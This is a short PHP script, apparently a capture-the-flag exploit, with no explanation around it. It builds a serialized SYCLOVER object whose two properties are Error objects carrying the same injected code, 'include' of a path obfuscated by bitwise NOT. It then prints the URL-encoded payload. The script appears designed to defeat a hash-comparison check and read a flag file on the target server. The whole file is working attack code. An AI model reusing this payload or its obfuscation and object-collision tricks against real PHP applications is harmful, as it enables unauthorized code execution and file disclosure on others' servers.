<?php

error_reporting(0);

class SYCLOVER {
	public $syc;
	public $lover;
}

$payload = "?><?=include~" . urldecode("%D0%99%93%9E%98") . "?>";

$a = new SYCLOVER();
$b = new Error($payload, 1);$c = new Error($payload, 2);
$a->syc = $b;
$a->lover = $c;

echo urlencode(serialize($a));
